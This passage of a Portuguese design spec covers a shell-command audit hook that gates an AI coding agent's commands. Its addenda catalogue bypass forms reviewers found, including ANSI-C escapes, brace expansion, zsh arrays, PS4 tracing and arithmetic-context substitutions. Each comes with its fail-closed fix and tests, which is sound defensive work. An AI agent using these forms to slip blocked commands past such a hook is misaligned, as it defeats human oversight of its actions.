4. **Replay** (seção 8): corpus das transcrições locais mais as métricas, cópia de `main` contra a nova; relatório por classe E1-E4 com **0 em E4**, cada E1 e E3 listado e revisado, contagem por motivo antes e depois. Os scripts do replay anterior (`.../scratchpad/replay3/`) servem de base; o carregador de corpus da medição desta spec está em `/tmp/claude-1000/-home-void-dotfiles--claude/e3f6c6b7-aa98-4561-b3d8-d1ff9c3c446c/scratchpad/lexer-spec/corpus.py`.
5. **Latência**: `analyze_command` no corpus (mediana, p95, p99, máximo) e o processo do hook (mediana de 15 execuções, pre de `pytest tests/test_a.py`), antes e depois, contra o orçamento da seção 7; carga do módulo com e sem `__pycache__`.
6. **Sondas**: as formas de L1-L10 e a sonda HIGH de `eee112a` (`A="x y z w v" docker restart api # "`) pelo processo do hook: todas negadas ou perguntadas; os scripts de sonda das revisões anteriores (`e2e.py`, `cap.py`, `fuzz.py`, `fo.py`, `variants.py` do scratchpad) sem exceção e sem allow de forma bloqueada.

Checks manuais do usuário, depois do merge (o hook vivo muda na hora):

- Uma sessão normal de trabalho (commits, testes, `cat > arquivo <<EOF`, `python3 - <<'EOF'`, `bash -c '...'`, laços `for`) sem negação `unclassified_command`, e sem diferença perceptível de latência.
- Depois de cerca de uma semana nas duas máquinas: `python3 ~/.claude/hooks/agent-metrics.py --since <data do merge> --merge`, seção "Parser uncertainty and hook health": nenhum falso positivo de nível B; cada `dynamic_command` ou `deny_token_unmatched` com comando bloqueado vira entrada pelo `backlog-keeper` (seção 8).

**needs_docs** (para o `docs-writer`, no fim):

- `.claude/README.md`, seção dos hooks: o módulo `agent_audit_shell.py` (parser puro, carregado por caminho com bytecode em cache), o subconjunto da gramática e o que fica fora (seção 2.4), o shell real ser o zsh, os motivos novos e os que saíram, a tabela de wrappers e de argumentos de código, a propagação de valores.
- `.claude/agent-workflow.md`: 13.6 (heredoc pelo receptor, HD1-HD6, expansões de corpo sem aspas); 13.8 (níveis A e B com os motivos novos; sem leitura tolerante); 14.2 (replay com o corpus das transcrições, classes E1-E4, ajuste da seção 8).
- `CLAUDE.md` da raiz, tabela `Test suites`: número de testes e tempo.

## Open questions

1. **Propagação de valores** (V1-V4, Task 5). Opções: (a) incluir: valores atribuídos no próprio texto resolvem nomes de programa e strings de código; código com variável desconhecida é nível B; (b) não incluir: todo código com variável é nível B, todo nome dinâmico é nível A. Recomendação: (a). É o único caminho que pega o caso real `T="docker compose ..."; zsh -c "$T down -v"` e o `T=...; $T down`, sem negar os laços legítimos `for c in ...; do zsh -c "$c"` (cerca de 14 comandos reais seriam negados com (b)).
2. **Nome de programa dinâmico sem valor conhecido** (N6). Opções: (a) nível A (`dynamic_command`), registrado, com o canário vendo os tokens seguintes; (b) nível B. Recomendação: (a) agora, e revisar com o replay e uma semana de métricas: até cerca de 54 comandos reais têm a variável vinda de fora do texto, e (b) negaria todos; uma forma bloqueada que se repetir vira regra precisa.
3. **Corpos para intérpretes de outra linguagem** (HD4, X7). Opções: (a) não ler como shell; (b) manter a leitura de shell linha a linha. Recomendação: (a). Uma linha de shell num programa Python é erro de sintaxe do Python, então a heurística nunca pegou nada real; (b) exige uma leitura tolerante (a armadilha dos corpos Python: 164 corpos reais não fecham como shell) e mantém falsos positivos reais.
4. **Lançador com bytecode em cache.** Opções: (a) spec própria, logo depois desta (o parser já vem em módulo com cache, então esta spec soma cerca de 0,6 ms, e o lançador economizaria cerca de 26 ms dos 27 de compilação); (b) uma Task 8 aqui, mudando o layout do hook e o `settings.json`. Recomendação: (a). Mantém esta spec sem mudança de config e reaproveita o mecanismo de import por caminho definido na seção 4.1.
5. **Escopo dos wrappers** (seção 4.2). Opções: (a) a lista da entrada mais os prefixos do zsh, `command`, `exec` e `builtin`; `doas`, `setsid`, `flock`, `chrt`, `taskset`, `find -exec` e `parallel` ficam para o ajuste por métricas; (b) incluir esses agora. Recomendação: (a). Nenhum deles aparece com comando bloqueado no corpus, e o canário registra se aparecer.
6. **Entradas do backlog.** Opções: (a) o `backlog-keeper` liga esta spec à entrada fonte e às três fundidas, registra "coberta em parte (texto de `parse_uncertain`)" na de watchdog, e as move para `In progress` quando o `/implement` começar; (b) `In progress` agora. Recomendação: (a), como nas specs anteriores.

*Adendo 2026-11-14:* pergunta 7 nova (o mesmo critério de subcomando nas regras de heredoc do `git`); ver [Adendo 2026-11-14](#adendo-2026-11-14---decisões-do-usuário-na-task-2), A2.

*Adendo 2026-11-14 (2):* perguntas 8-13 novas; ver [Adendo 2026-11-14 (2)](#adendo-2026-11-14-2---rodada-de-correções-da-revisão), "Perguntas 8-13".

*Adendo 2026-11-14 (3):* nenhuma pergunta aberta. A pergunta 7 foi aplicada como opção (a) na Task 3, e as perguntas 8-13 foram decididas pelo usuário em 2026-11-14 (8a, 9a, 10a, 11a, 12a, 13b); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), "Perguntas 7-13 (decididas)".

## Adendo 2026-11-14 - decisões do usuário na Task 2

- **Origem**: decisões do usuário durante a Task 2, a partir do replay (seção 8) e das medidas de processo (seção 7). O detalhe (comandos do replay, números, arquivos) fica no [log.md](log.md), Task 2.
- **Afeta**: Design, seções 1 (HD3, P2), 4.2 (`Readings`), 4.5, 5 (passo 4 e "Comportamento resultante") e 7; Testing (SP5, testes novos `test_hd3_*` e GC1, Regras -> testes); Task 2 (**Files**, **Done when**), Task 3 (**Files**, **Done when**), Task 5 (**Files**, **Done when**); Open questions (pergunta 7). O **Status** da spec e das tasks não muda. O texto original fica como registro; onde divergir, vale este adendo.
- **Não muda**: motivos, níveis e flags (U1-U4); HD1, HD2, HD4-HD6; os desqualificadores de script inteiro; as regras de dado de `git`/`gh` com `-F -` e de `$(cat <<EOF)` como valor de mensagem (H3); o canário; `agent-audit.json` e `settings.json`.

### A1 - HD3 revisado: `cat`/`tee` com saída redirecionada em função ou grupo `{ }` (Design 1 e 5, Task 2)

**Motivo.** O replay mostrou 2 falsos positivos reais: `mk(){ cat > "$1/log.md" <<EOF ...}` e `HEAD() { cat <<EOF ...}`. Pela regra original o `cat` não estava no nível de cima, então os corpos (markdown e HTML) eram lidos como shell (HD4) e negados com `lex_error`. A regra nova exige o redirecionamento de saída no próprio `cat`/`tee`: remove o primeiro; o segundo, sem redirecionamento próprio, continua código (a função pode alimentar um pipe; ver a tabela abaixo).

**Linha HD3 nova** (substitui a da seção 1):

| # | Regra |
|---|---|
| HD3 | Corpo de **dado**: as regras de sink sobre a árvore (seção 5): `cat`/`tee` fora de pipeline, no nível de cima ou, com redirecionamento de saída próprio, dentro de corpo de função ou de grupo `{ }` que não está em pipeline; `git commit -F -`, `gh ... -F -`, `$(cat <<EOF)` sozinho como valor de `git commit -m` ou de opção de mensagem do `gh`; prefixo limpo (H2 da hardening); desqualificadores de script inteiro mantidos |

**Passo 4 da seção 5, parte `cat`/`tee`** (substitui "`cat`/`tee`: dado só com `site.top_level`, `site.stages == 1`"): dado com `site.stages == 1` e uma destas condições:

1. `site.top_level` (como antes);
2. o comando está num corpo de função ou de grupo `{ }`, cada composto da cadeia até o script de cima é função ou grupo (aninhados uns nos outros contam) e é sozinho um pipeline inteiro (um estágio), e o próprio `cat`/`tee` tem um redirecionamento de saída que não é heredoc (`>`, `>>`, `>|`, `&>`, `&>>`).

Subshells `( )`, substituições, pipelines e os outros compostos (`if`, `for`, `while`, `until`, `case`, `select`, `coproc`) mantêm a regra original: o corpo é código. Os passos 1-3 (desqualificadores, prefixo limpo, nenhuma substituição no próprio comando) e HD2 continuam valendo antes.

**Comportamento resultante** (complementa a tabela da seção 5; corpo markdown ou HTML com crases, `${...}` ou aspas sem par, salvo indicação):

| Comando | Antes do adendo | Depois |
|---|---|---|
| `mk() { cat > "$1/log.md" <<EOF` ... `EOF` + `}` | `lex_error` (falso positivo) | removido |
| `{ cat >> f <<'EOF'` ... `EOF` + `}`, `{ tee f > /dev/null <<EOF` ... `EOF` + `}` | `lex_error` | removido |
| `{ tee -a f <<EOF` ... `}` (o arquivo é argumento, sem redirecionamento de saída) | `lex_error` | `lex_error` |
| `f() { cat > f <<EOF` com `$(docker restart x)` no corpo | `docker_lifecycle` | `docker_lifecycle` (HD2) |
| `HEAD() { cat <<EOF` ... `}` (sem redirecionamento de saída do `cat`) | `lex_error` | `lex_error` (a função pode alimentar um pipe) |
| `{ HEAD x; cat <<EOF` ... `} > page.html` | `lex_error` | `lex_error` (o redirecionamento é do grupo, não do `cat`) |
| `{ cat > f <<EOF` ... `} \| bash` | código | código (pipeline) |
| `( cat > f <<EOF` ... `)`, `x=$( { cat > f <<EOF` ... `} )` | código | código (subshell, substituição) |
| `if true; then cat > f <<EOF` ... `fi` | código | código (composto que não é função nem grupo) |
| `cat() { bash; }; g() { cat > f <<EOF` ... `}` | código | código (desqualificador) |

**Testes** (`test_command_positions.py`, Task 2, já escritos): `test_hd3_cat_with_an_output_redirect_in_a_function_or_group_is_data` (`mk()` com `cat >`, grupo com `cat >>` e com `tee f > /dev/null`, grupo aninhado, `function mk { ... }`: sem flag e sem motivo) e `test_hd3_what_stays_code_in_a_group_or_function` (`HEAD()` sem redirecionamento, redirecionamento do grupo, grupo ou função em pipeline, subshell, `if`, `cat` em pipeline dentro do grupo, substituição: `lex_error` e `unclassified_command`; com `docker restart x` no corpo e pipe para `bash`, `docker_lifecycle`). Regras -> testes: HD3 ganha os dois.

### A2 - Classificação de `git commit` pelo subcomando (Design 4.5, Task 3)

**Motivo.** A regex `^git (\S+ )*commit\b` de `_classify_segment` casa `commit` em qualquer palavra depois de `git`, inclusive `git config --get commit.gpgsign`. Antes o hook não via esse comando dentro de `$(...)`; com o parser (S5) vê, e o replay mostrou perguntas `git_commit` falsas (classe E1).

**Regra nova** (Task 3): `git-commit`/`git_commit` só quando o subcomando é `commit`. Depois de `git` (cabeça normalizada da leitura), as opções globais do [git(1)](https://git-scm.com/docs/git) são puladas e a primeira palavra restante é o subcomando; `commit` em argumento ou valor (`git config --get commit.gpgsign`, `git log --grep commit`, `git show commit`) não conta. A regex sai de `_classify_segment` e dá lugar a uma função sobre as palavras da leitura.

| Opção global | Forma pulada |
|---|---|
| `-C`, `-c` | a opção e a palavra seguinte |
| `--git-dir`, `--work-tree`, `--namespace`, `--config-env`, `--attr-source` | com `=`, uma palavra; sem `=`, também a palavra seguinte (o parser de opções do git aceita as duas formas) |
| `--exec-path=`, `--list-cmds=` | uma palavra |
| booleanas: `-p`, `-P`, `--paginate`, `--no-pager`, `--bare`, `--no-replace-objects`, `--no-lazy-fetch`, `--no-optional-locks`, `--no-advice`, `--literal-pathspecs`, `--glob-pathspecs`, `--noglob-pathspecs`, `--icase-pathspecs`, `--exec-path`, `--html-path`, `--man-path`, `--info-path`, `-v`, `--version`, `-h`, `--help` | uma palavra |
| desconhecida (começa com `-`) | duas leituras, consumindo ou não a palavra seguinte (como N3); `commit` como subcomando em qualquer uma dá `git_commit` |
| `--` | encerra as opções; a palavra seguinte é o subcomando |

Falha fechada: na dúvida, a leitura em que `commit` é subcomando vale.

**Teste GC1** (`test_classify.py`, Task 3; literais montados como na seção Testing): sem `git_commit`: `git config --get commit.gpgsign`, `S=$(git config --get commit.gpgsign)`, `git log --grep commit`, `git -C repo show commit`; com `git_commit`: `git commit -m x`, `git -C repo commit -m x`, `git -c user.name=x commit -m x`, `git --git-dir=.git --no-pager commit -m x`, `git --git-dir .git commit -m x`, `git --frobnicate x commit -m y`. Regras -> testes: a classificação de `git commit` ganha GC1.

### A3 - Metade do hook de SP5 (Testing, Tasks 2 e 5)

**Motivo.** Expor `audit.shell` na Task 2 liga `test_sp5_the_hook_flags_every_wrapped_form`, que exige wrappers (Task 3), argumentos de código (Task 4) e valores (Task 5) antes de existirem.

**Regra.** Da Task 2 em diante o teste fica pulado sem condição, com o motivo e a Task 5 no texto do `unittest.skip`. A Task 5 tira o skip e faz o teste passar com todos os envoltórios e composições de SP5. Substitui a suposição da Task 1 no log ("Tasks 2-5 must turn it on"). `test_shell_properties.py` entra no **Files** das Tasks 2 e 5; as Tasks 3 e 4 não mexem nele. A metade do parser (`test_sp5_parser_sees_every_wrapped_form`) continua ativa.

### A4 - Restrição de desenho: o hook não importa `typing` (Design 1, 4.2 e 7, Task 2)

**Motivo.** O import de `typing` custava cerca de 3 ms por chamada do hook, o aumento inteiro permitido para o processo (seção 7). A Task 2 trocou `typing.NamedTuple` por `collections.namedtuple` no hook.

**Regra.** `agent-audit.py` e `agent_audit_shell.py` não importam `typing` (nem `from typing`); anotações ficam como texto (`from __future__ import annotations`). `Readings` e `Analysis` são `collections.namedtuple` com os mesmos campos, na mesma ordem, e o mesmo default (`starts=()`); o código da seção 4.2 vale pelos campos, não pela classe base. O módulo já cumpre desde a Task 1 (classes com `__slots__`, ver o log). P2 passa a ser "só `re` da stdlib"; BIO11 continua como está (ainda permite `typing` no módulo); nenhum teste estrutural novo, a restrição é checada na revisão. Uma mudança futura no hook que precise de `typing` exige medir o processo de novo contra a seção 7.

*Adendo 2026-11-14 (3):* BIO11 deixou de aceitar `typing` (Pergunta 8, opção (a)); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), A26.

### Pergunta 7 (aplicada: opção (a), Task 3)

*Adendo 2026-11-14 (3):* aplicada como opção (a) na Task 3 (log, Task 3): uma função só de subcomando (`_git_has_subcommand`/`_is_git_commit`) serve a classificação, a decisão de dado de `git ... -F -` e o valor de mensagem `$(cat <<EOF)` (H3); ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), "Perguntas 7-13 (decididas)". O texto abaixo fica como registro.

**Mesmo critério de subcomando nas regras de heredoc do `git`.** `_heredoc_is_data` aceita `git ... -F -` com `"commit" in words`, e `_GIT_MESSAGE_VALUE` (H3) usa `\bcommit\b`; os dois aceitam `commit` como argumento. Opções: (a) usar a função de subcomando de A2 nos dois, na Task 3, com casos em GC1 e em `StdinFileSinkLimits`; (b) deixar como está (o erro ali só torna dado um corpo que já iria para um comando `git`). Recomendação: (a). Com uma regra só para "é um `git commit`", a classificação e a decisão de dado não divergem; o risco de (b) é baixo, mas é a mesma classe de erro que A2 corrige.

## Adendo 2026-11-14 (2) - rodada de correções da revisão

- **Origem**: a revisão de fim de run (`code-reviewer` e `security-reviewer`, os dois com "fix first") achou formas em que o bash ou o zsh rodam um comando bloqueado e o hook libera ou só registra em nível A, três falsos positivos e o processo do hook acima do orçamento (+10,6 ms contra +3 ms). O usuário decidiu uma rodada única de correções cobrindo tudo, inclusive as lacunas que já existiam em `eee112a` (aliases do git, opções globais do docker), resolver os lançadores de intérprete, tratar clientes SQL/DSL como outra linguagem e mover o classificador para um segundo módulo agora. A rodada correu em partes A, B1, B2, B1b e C; o detalhe (comandos, replay, medidas) fica no [log.md](log.md), blocos "Review" a "Fix part C".
- **Incidente**: uma sonda da revisão de segurança rodou programas reais (um `git push` real dos commits já feitos; nada não commitado saiu). Daqui em diante as sondas de Verification 6 nunca executam programas reais: só binários stub, conferidos antes de cada execução (log, bloco "Incident").
- **Afeta**: Summary; Design, seções 1 (S2, S5, S9, S10, N6, X1, X3, X4, V1-V3, HD3, HD4, P2), 2.1, 2.4, 3, 4.1-4.5, 5 e 7; Alternatives ("Onde fica o parser"); Trade-offs (propagação insensível ao fluxo); Testing (BIO11, testes novos, Regras -> testes); Open questions (perguntas 8-13). O **Status** da spec e das tasks não muda. O texto original fica como registro, salvo as correções no lugar marcadas "revisado pelo Adendo 2026-11-14 (2)" (linha `<(...)` da seção 2.1, P2, linha BIO11 da Testing, Trade-offs); as outras seções afetadas ganham só uma nota que aponta para cá. Onde divergir, vale este adendo.
- **Não muda**: os níveis A e B e os motivos (U1-U4, nenhum motivo novo; as negações novas usam `dynamic_code`, `piped_shell`, `lex_error` e `analysis_budget`); HD1, HD2, HD5, HD6; o canário como registro; `agent-audit.json` e `settings.json`.
- **Resultado medido** (log): suite 766 testes OK; replay de 13.779 comandos com E1 244 / 190, E2 92 / 60, E3 50 / 25, E4 0; `analyze_command` mediana 0,351 ms, p99 2,03 ms (B2).

### A5 - Parser: `$'...'`, substituição de processo, formas do zsh e heredocs pendentes (Design 1, 2.1, 3, Task 1)

**Motivo.** Achados das duas revisões: `$'...'` guardava os escapes crus, então `$'\x64ocker' restart x`, `git $'\x70ush'` e o heredoc `cat <<$'E\x4fF'` (regressão: `eee112a` perguntava) passavam sem motivo; `A=<(true) docker restart x` deslocava a cabeça; `[[ -n <(cmd) ]]` não via o `cmd`; `$=D` do zsh era texto; `repeat 3 { cmd }` não era rejeitado (S9 já o listava); um heredoc pendente antes de `[[` ou de uma lista de array tinha o corpo lido como palavras.

**Regras.**

| Item | Regra |
|---|---|
| `$'...'` (S2) | decodificado como no bash: `\xHH`, octal, `\u`/`\U`, `\cX`, `\e`/`\E` e os escapes de uma letra (`\a \b \f \n \r \t \v \\ \' \"`). O que não decodifica com certeza (escape desconhecido, NUL, valor de 0x80 em diante, `\x`/`\u`/`\c` sem dígito ou caractere, barra mais nova linha, `\C-` do zsh) marca `Part.dyn`, e a palavra fica dinâmica. Vale para nome de programa, argumentos, valores atribuídos e delimitador de heredoc |
| `<(...)`, `>(...)` (S5) | substituição de processo em qualquer lugar de uma palavra sem aspas e nos operandos de `[[ ]]`, salvo o operando de `=~` (linha da seção 2.1 corrigida no lugar) |
| `$=NAME`, `$~NAME`, `$^NAME` | partes `param` (também as formas dobradas e entre chaves). No hook, um nome de programa nessa forma não é resolvido: nível B (`dynamic_code`), conferido em processo nesta revisão |
| `repeat N {` (S9) | `ShellSyntaxError` `unsupported` (`lex_error`); `repeat N cmd` continua wrapper (N4) |
| Heredoc pendente em `[[ ]]` e arrays (HD1) | `_cond` e `_array` leem os corpos pendentes na nova linha, como a nova linha operador |
| API nova (seção 3) | `Part.dyn`; `Part.code` (flags `(e)` e `(%)` do zsh, operador `@P` do bash); `Word.evaluates_code`; `Word.has_brace` (brace expansion sem aspas, sobre-aproximada); `DYNAMIC_KINDS`, `DECLARE_BUILTINS`, `part_scripts`, `iter_compounds` públicos |

**Testes.** `test_shell_lexer.py`: SL14 `AnsiQuoting`, SL15 `HeredocBodiesInsideCompoundWords`, SL16 `ProcessSubstitutionPlaces`, SL17 `ZshParameterForms`, SL18 `ZshRepeat`, SL19 `BraceExpansion`, SL20 `CodeEvaluatingExpansions` (103 testes no módulo). No nível do hook: `AnsiCQuotedWords` (`test_classify.py`) e os testes de `$'...'` de `ReviewFixB1`; as demais formas desta seção só têm teste no parser (Pergunta 10).

*Adendo 2026-11-14 (3):* as formas desta seção ganharam testes no nível do hook (`ParserFormsAtTheHookLevel`, Pergunta 10, opção (a)), e `\cX` segue o bash; ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final), A21 e A27.

### A6 - Nomes de programa e verbos: `$'...'`, brace expansion, região do verbo e `evaluates_code` (Design 1 N6, 2.4, 4.4, 4.5)

**Motivo.** Achados de segurança: `{git,push}` e `{docker,restart,x}` rodam no bash e passavam (`has_glob` só olhava `* ? [`); `c=push; git $c` e `for a in stop start; do docker compose $a api; done` passavam (V2 só usava valores no nome de programa); `${(e)...}` e `${X@P}` avaliam texto como código.

**Regras.**

1. **`$'...'` decodificado** classifica pelo texto decodificado, no nome de programa e no verbo. Indecodificável no nome de programa é nível B (`dynamic_code`), não nível A: o bash e o zsh discordam do nome, então ele não é um nome do ambiente. Na região do verbo, também nível B.
2. **Brace expansion no nome de programa**: uma lista simples de vírgulas sem aspas, até `MAX_VALUE_CANDIDATES` (16) palavras, é resolvida nas palavras que o shell gera (`{docker,restart,x}` lê `docker restart x`; `sudo {git,push}`). Uma que não resolve (intervalo `{1..3}`, parte entre aspas, mais de 16 palavras) é nível A `dynamic_command` no nome de programa de cima e nível B numa string de código ou na região do verbo. `echo {a,b}`, `find -exec {}` e `git log {}` não são dinâmicos.
3. **Região do verbo** de `git`, `docker` e `gh`: as palavras depois das opções (uma opção de valor conhecida consome a palavra seguinte) até a primeira palavra literal que não é opção, inclusive; `compose` e `container` do docker continuam a região. Valores conhecidos são substituídos ali (V2 estendido), uma combinação por leitura, até 16. Para `git` e `docker`, uma palavra dinâmica que sobra na região é nível B (`git $X`, `git "$@"`, `docker $(cmd) x`, `git pu*`, `git ${X:-push}`, mais de 16 combinações, divisão de palavras alterada); para `gh`, só a substituição. Um nome com valores conhecidos e também uma possibilidade desconhecida mantém a negação e é nível B (`if x; then c=push; fi; git $c`). Palavra dinâmica fora da região não é nível B (`git -C $d status`, `git commit -m "$m"`, `docker exec $c ls`, `gh $g create`).
4. **`Word.evaluates_code`** em qualquer palavra (argumento, alvo de redirecionamento, lista de `for`, array, palavra de `case`, substituição aninhada) é `dynamic_code`. `${(L)X}`, `${X@Q}`, `${X@U}` não são.

**Testes.** `ReviewFixB1` (`test_command_positions.py`): `test_a_ansi_c_part_with_certain_text_is_classified_by_its_decoded_text`, `test_a_ansi_c_part_that_cannot_be_decoded_is_a_dynamic_head_at_level_b`, `test_a_brace_expansion_at_the_head_is_resolved_when_it_can_be`, `test_a_brace_expansion_at_the_head_that_cannot_be_resolved_is_n6`, `test_a_brace_expansion_that_is_not_one_is_not_dynamic`, `test_a_word_that_evaluates_code_is_dynamic_code`, `test_known_values_in_the_verb_of_git_and_docker_are_substituted`, `test_a_dynamic_word_left_where_the_verb_could_be_is_level_b`, `test_a_name_with_values_and_an_unknown_part_keeps_the_deny_and_is_level_b`, `test_a_dynamic_word_that_is_not_the_verb_is_not_level_b`, `test_the_cap_and_the_splitting_of_the_verb_substitution_fail_closed`; `AnsiCQuotedWords` (`test_classify.py`).

*Adendo 2026-11-14 (3):* a regra 2 foi revisada: partes entre aspas de uma brace expansion são texto e a brace expansion irresolúvel no nome de programa é nível B em qualquer lugar (A18); `test_a_brace_expansion_at_the_head_that_cannot_be_resolved_is_n6` virou `..._is_level_b`. Operadores de parâmetro no nome de programa: A16. Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### A7 - Valores que falham fechados (Design 1 V1-V3 e N6, 4.4; decisão do usuário em B1b)

**Motivo.** Achados: a propagação transformava negações em nível A. Mais de 16 valores no nome de programa caía em `dynamic_command`; `eval`/`source`/`.` apagavam os valores conhecidos; `+=`, `read`, `builtin export`, `${X:=}`, `declare -n`, `print -v` e subscritos tornavam o conjunto de valores aparentemente completo; `D=(docker restart x); $D` (zsh roda o array inteiro) e `IFS=,; x=docker,restart,y; $x` passavam; e a união insensível ao fluxo perdia o valor do ambiente num uso antes de uma atribuição condicional (Trade-offs corrigido no lugar).

**Regras.**

1. **Texto opaco**: um texto com `eval`, `source` ou `.` (também atrás de `builtin`, `command` ou `sudo`), ou com um nome de programa que pode ser um builtin que atribui (`R=read; $R D`), não conhece nenhum valor: todo nome de programa dinâmico desse texto é nível B (`dynamic_code`), inclusive nomes que o texto não atribui (`source ./f; $D x`).
2. **Formas que tornam o nome desconhecido**: `+=`; `read` (inclusive `read 'D?prompt'`), `mapfile`, `readarray`, `getopts`, `printf -v`, `print -v`, `vared`; `unset`; `set -A`; `let`; atribuição de elemento (`D[1]=x`); `declare`/`typeset`/`local`/`export` com valor dinâmico; `declare -n`, `typeset -n`, `local -n`, `export -n` (os dois nomes); `${N:=v}`, `${N=v}`, `${N::=v}`, também com flags do zsh (`${(L)N:=v}`). Os builtins são reconhecidos pela cabeça normalizada da leitura (`builtin read`, `command export`, `sudo read`).
3. **Nível do nome de programa dinâmico**: nome atribuído no texto com valor desconhecido, parâmetros posicionais e formas que não são variável simples (`$1`, `$@`, `$*`, `$#`, `${a[@]}`, `${!n}`) e mais de 16 valores são nível B (`dynamic_code`); um nome que só vem do ambiente continua nível A `dynamic_command` (N6, Open questions 2).
4. **Primeira atribuição incondicional** (V3 revisado): um uso antes da primeira atribuição incondicional de nível de cima acrescenta o valor do ambiente como candidato; o comando é nível B e os valores conhecidos continuam classificados (`if x; then D=docker; fi; $D restart x` dá `docker_lifecycle` e nível B). Não são incondicionais: ramos de `if`/`case`, laços, subshell, grupo `{ }`, corpo de função, substituição, estágio de pipeline, `&` de fundo, o lado direito de `||`, e uma atribuição como prefixo de comando (`R=$(x) true`). Uma cadeia `&&` vale até o fim dela (`true && D=docker && $D x` resolve; `true && D=docker; $D x` não). Os valores descem para strings de código no mesmo estado (`if x; then D=docker; fi; bash -c "$D ..."` é nível B), e uma atribuição de prefixo chega ao shell que ela inicia (`D=docker bash -c '$D restart x'`). Um receptor de heredoc atribuído depois do uso não é conhecido.
5. **Arrays do zsh**: `D=(a b c); $D` dá cada elemento e a forma juntada por espaço (`docker restart x`); `"${D[@]}"`, `${D[*]}` e `${D}` idem. Elemento vindo de substituição ou array alterado por elemento: nível B.
6. **IFS e divisão de palavras**: qualquer atribuição de `IFS` (direta, `export`, `declare`, `local`, `typeset`, `read IFS`, `unset IFS`, `${IFS:=x}`), `setopt shwordsplit`/`sh_word_split` (qualquer caixa), `set -o shwordsplit` e `emulate sh|ksh|bash` (também com `-L`) tornam desconhecidos os valores divididos: nome de programa e região do verbo nível B. Não contam `IFS= read`, `IFS=: read a b` (prefixo de um comando) e `emulate zsh`.
7. **Nomes suaves (decisão do usuário, B1b)**: um nome cujo valor inteiro é uma substituição de comando (`R=$(x)`, `R="$(x)"`, crases; também por `declare`, `builtin export`, `command export`) é suave: como nome de programa no texto de cima é nível A `dynamic_command`, e os outros valores conhecidos dele continuam classificados (`R=docker; R=$(x); $R restart x` dá `docker_lifecycle` e `dynamic_command`). Ficam em nível B: valor misto (`R=a$(x)`, `R=$(x)b`), lista de `for` sobre `$(...)`, elemento de array vindo de substituição, uso antes da primeira atribuição incondicional, e um nome suave usado numa string de código, num corpo de heredoc ou here-string, ou na região do verbo de `git`/`docker`; e qualquer forma das regras 1, 2 e 6 sobre ele.
8. **Diretório dinâmico**: um valor `$S/x.sh` nomeia o programa pelo último componente (N2), sem nível B; um valor que é só `$S` é nível B.

**O que continua nível B** (replay de B1b, 4 comandos de E3): `. arquivo` seguido de um nome de programa variável; `mapfile` com cabeça `"${CMD[@]}"`; uma função que repassa `"$@"`; e `cd x && BIN=$(...); $BIN`, porque a atribuição da cadeia `&&` vale só até o fim dela (Pergunta 12).

**Testes.** `ReviewFixB1`: `test_a_head_over_the_cap_is_level_b`, `test_a_dynamic_head_of_a_name_the_text_assigns_is_level_b_and_the_environment_alone_is_level_a`, `test_eval_source_and_dot_make_every_assigned_name_level_b`, `test_the_forms_that_assign_make_the_name_unknown`, `test_the_builtins_behind_a_wrapper_are_matched_by_their_normalized_head`, `test_a_use_before_the_first_unconditional_assignment_keeps_the_environment_as_a_value`, `test_the_known_values_of_a_late_use_are_still_read`, `test_a_zsh_array_in_the_program_position_joins_its_elements`, `test_a_change_of_the_word_splitting_makes_split_values_unknown`, `test_b1b_a_head_whose_only_unknown_value_is_a_command_substitution_is_level_a`, `test_b1b_what_stays_level_b_for_a_name_a_substitution_gives`, `test_a_value_with_a_dynamic_directory_names_the_program_by_its_last_component`, `test_a_wrapper_argument_that_is_a_variable_is_the_ambiguity_of_the_readings_not_a_dynamic_name`, `test_a_heredoc_receiver_set_after_its_use_is_not_known`, `test_the_values_of_a_text_reach_a_code_string_in_the_same_state`. UN9 e CP17-CP20 continuam passando.

*Adendo 2026-11-14 (3):* a função que repassa `"$@"` saiu da lista "O que continua nível B" (A24); a Pergunta 12 foi decidida como (a) e `cd x && BIN=$(...); $BIN` continua nível B; a consulta de valores por posição ficou linear (A22). Ver [Adendo 2026-11-14 (3)](#adendo-2026-11-14-3---rodada-final).

### A8 - Contextos que avaliam texto como código (Design 1 X3, 2.4; decisão do usuário em B1b)

**Motivo.** Achado de segurança: `PS4='$(cmd)' bash -xc :` e `x='a[$(cmd)]'; [[ $x -eq 0 ]]` rodam `cmd` no bash sem que o texto tenha uma posição de comando. A primeira versão (B1) negava qualquer `$(` ou crase entre aspas simples num texto com aritmética e negou 9 comandos legítimos do replay (padrões de `sed`/`awk`, argumentos de `adb`); o usuário estreitou a regra.

**Regras.**

1. **`PS4` com tracing**: o texto contém `PS4` e alguma evidência de tracing (um cluster de opções curtas com `x`, como `-x`, `-ex`, ou o nome `xtrace` em `set -o xtrace`/`setopt xtrace`): `dynamic_code`. Sobre-aproximação deliberada (`PS4='$(x)' tar -xzf a.tgz` também conta). `PS4` sem tracing e tracing sem `PS4` não contam.
2. **`${(e)X}`, `${(%)X}`, `${X@P}`**: A6, regra 4.
3. **Substituição entre aspas que chega à aritmética (decisão do usuário)**: um nome atribuído de texto entre aspas (ou escapado) com `$(` ou crase fica marcado, também através de outros nomes. É nível B (`dynamic_code`) só quando o texto entre aspas ou um nome marcado é operando de um contexto que avalia aritmética: subscrito de array (`${a[$x]}`, `A[$x]=1`), `(( ))`, `for ((...))`, `$(( ))`, `$[ ]`, `${x:off}`, `let`, `declare`/`typeset`/`local -i`, teste numérico em `[[ ]]`, `[` ou `test`, ou uma string de shell aninhada que faz aritmética com ele. Um argumento entre aspas em forma de subscrito de `printf`, `test`, `[`, `unset`, `read`, `declare`, `local`, `export` e afins (`unset 'a[$(x)]'`) também é nível B. Aritmética em outro lugar do mesmo texto não conta mais; padrões de `sed`/`awk`/`grep`, argumentos de `adb shell '...'` e `sh -c 'echo $(date)'` não são negados por esta regra.

**Suposições da implementação** (log, B1b; Pergunta 11): `[`/`test` numéricos tratados como `[[ ]]`; outros programas com argumento em forma de subscrito (`awk '{a[$(NF)]}'`) não são negados.

